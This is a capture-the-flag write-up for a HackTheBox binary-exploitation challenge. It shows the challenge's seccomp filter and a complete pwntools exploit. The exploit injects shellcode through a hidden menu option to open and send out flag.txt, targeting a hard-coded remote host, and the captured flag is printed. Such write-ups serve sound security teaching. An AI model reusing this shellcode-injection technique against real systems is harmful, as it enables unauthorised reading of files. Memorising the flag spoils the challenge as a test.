# Fleet Management

## Challenge

An interactive menu with a hidden option that runs shellcode with seccomp restrictions.

### Seccomp dump

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0006: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0010
 0007: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0010
 0008: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

## Solution

We have access to the `openat` and `sendfile` syscalls.

We can push a string with the flag filename on the stack and get a filedescriptor to it using `openat`.
We can then send the file contents to stdout using the `sendfile` syscall.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 134.209.22.191 --port 31974 fleet_management
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fleet_management')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '134.209.22.191'
port = int(args.PORT or 31974)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

shellcode = [
        shellcraft.pushstr("flag.txt"),
        shellcraft.openat('AT_FDCWD', 'rsp', 0),
        shellcraft.sendfile(0, 'rax', 0, 0x100),
        ]

bytecode = asm(''.join(shellcode))

print(hex(len(bytecode)))
print(disasm(bytecode))

io.sendlineafter(b"What do you want to do? ", b"9")
io.send(bytecode)

io.interactive()
```

## Flag

```
HTB{backd00r_as_a_f3atur3}
```
